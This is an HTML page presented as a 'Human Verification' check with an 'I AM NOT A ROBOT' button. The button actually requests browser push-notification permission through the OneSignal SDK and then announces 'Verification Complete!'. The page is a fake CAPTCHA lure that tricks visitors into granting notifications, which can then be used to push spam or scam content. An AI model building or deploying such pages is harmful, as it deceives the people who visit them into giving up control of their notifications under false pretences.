<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Required</title>
    <style>
        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; background: #f0f2f5; margin: 0; }
        .box { background: white; padding: 40px; border-radius: 12px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 400px; }
        h3 { color: #1c1e21; }
        p { color: #606770; margin-bottom: 20px; }
        button { background: #1877f2; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
        button:hover { background: #166fe5; }
    </style>

    <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignal.public.js" defer></script>
</head>
<body>

    <div class="box">
        <h3>Human Verification</h3>
        <p>Please click below and allow the browser prompt to continue.</p>
        <button id="btn">I AM NOT A ROBOT</button>
    </div>

    <script>
        // Initialize OneSignal
        window.OneSignalDeferred = window.OneSignalDeferred || [];
        OneSignalDeferred.push(async function(OneSignal) {
            await OneSignal.init({
                appId: "5c52055b-50a2-4da8-89c5-9eb4191b68d0",
            });
            console.log("OneSignal Initialized");
        });

        // Set up the button click logic
        document.getElementById('btn').onclick = function() {
            console.log("Button clicked!");
            OneSignalDeferred.push(function(OneSignal) {
                OneSignal.Notifications.requestPermission();
            });
        };

        // Success Listener
        OneSignalDeferred.push(function(OneSignal) {
            OneSignal.Notifications.addEventListener('permissionChange', function(permission) {
                if (permission === 'granted') {
                    alert("Verification Complete! You're connected.");
                }
            });
        });
    </script>

</body>
</html>
